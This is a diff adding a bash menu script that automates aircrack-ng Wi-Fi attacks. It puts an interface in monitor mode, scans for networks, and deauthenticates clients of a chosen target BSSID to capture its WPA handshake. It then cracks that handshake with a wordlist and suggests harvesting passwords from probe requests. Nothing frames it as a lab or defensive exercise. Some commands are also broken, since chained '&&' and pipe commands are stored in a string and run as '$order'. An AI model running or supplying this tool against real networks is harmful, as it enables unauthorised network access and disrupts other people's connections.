@@ -1,0 +1,72 @@
+#!/bin/bash
+
+function intro {
+    clear
+    echo "Welcome To Aircrack-Ng Automation Tool"
+    echo "[1] Start monitor mode"
+    echo "[2] Stop monitor mode"
+    echo "[3] Scan Networks"
+    echo "[4] Getting Handshake (Need Monitor mode)"
+    echo "[5] Crack Handshake with wordlist (Handshake needed)"
+    echo "[0] Exit"
+    echo ""
+    read -p "[Choose Your Step] " var
+
+    if [ "$var" == "1" ]; then
+        read -p "Enter the interface: (Default: wlan0/wlan1) " interface
+        order="airmon-ng start $interface && airmon-ng check kill"
+        $order
+        intro
+
+    elif [ "$var" == "2" ]; then
+        read -p "Enter the interface: (Default: wlan0mon/wlan1mon) " interface
+        order="airmon-ng stop $interface && service network-manager restart"
+        $order
+        intro
+
+    elif [ "$var" == "3" ]; then
+        read -p "Enter the interface: (Default: wlan0mon/wlan1mon) " interface
+        order="airodump-ng $interface -M"
+        echo "When Done Press CTRL+c"
+        sleep 3
+        $order
+        sleep 10
+        intro
+
+    elif [ "$var" == "4" ]; then
+        read -p "Enter the interface: (Default: wlan0mon/wlan1mon) " interface
+        order="airodump-ng $interface -M"
+        echo -e "\nWhen Done Press CTRL+c"
+        echo -e "\nNote: Under Probe it might be Passwords So copy them to the wordlist file"
+        echo -e "\nDon't Attack The Network if its Data is ZERO (you waste your time)"
+        echo -e "\nyou Can use 's' to arrange networks"
+        sleep 7
+        $order
+        read -p "Enter the bssid of the target? " bssid
+        read -p "Enter the channel of the network? " channel
+        read -p "Enter the path of the output file? " path
+        read -p "Enter the number of the packets [1-10000] (0 for unlimited number): " dist
+        order="airodump-ng $interface --bssid $bssid -c $channel -w $path | xterm -e aireplay-ng -0 $dist -a $bssid $interface"
+        $order
+        intro
+
+    elif [ "$var" == "0" ]; then
+        clear
+        echo "BYEEEEE!!!!"
+        exit
+
+    elif [ "$var" == "5" ]; then
+        read -p "Enter the path of the handshake file? " path
+        read -p "Enter the path of the wordlist? " wordlist
+        order="aircrack-ng $path -w $wordlist"
+        $order
+        exit
+
+    else
+        echo "Not Found"
+        sleep 2
+        intro
+    fi
+}
+
+intro
